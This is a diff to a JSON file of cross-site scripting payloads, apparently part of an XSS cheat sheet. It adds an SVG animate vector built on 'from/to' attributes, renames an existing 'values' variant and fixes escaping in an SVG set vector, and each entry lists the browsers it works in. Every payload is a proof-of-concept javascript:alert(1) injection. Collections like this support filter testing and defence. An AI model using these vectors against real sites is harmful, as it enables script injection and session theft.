@@ -84,7 +84,7 @@
         ]
     },
     {
-        "description": "SVG animate tag",
+        "description": "SVG animate tag using values",
         "code": "<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) \/><a id=xss><text x=20 y=20>XSS<\/text><\/a>",
         "browsers": [
             "chrome",
@@ -94,8 +94,18 @@
         ]
     },
     {
+        "description": "SVG animate tag using to",
+        "code": "<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 \/><a id=xss><text x=20 y=20>XSS<\/text><\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
         "description": "SVG set tag",
-        "code": "<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS<\/text><\/a>",
+        "code": "<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) \/><a id=xss><text x=20 y=20>XSS<\/text><\/a>",
         "browsers": [
             "chrome",
             "firefox",
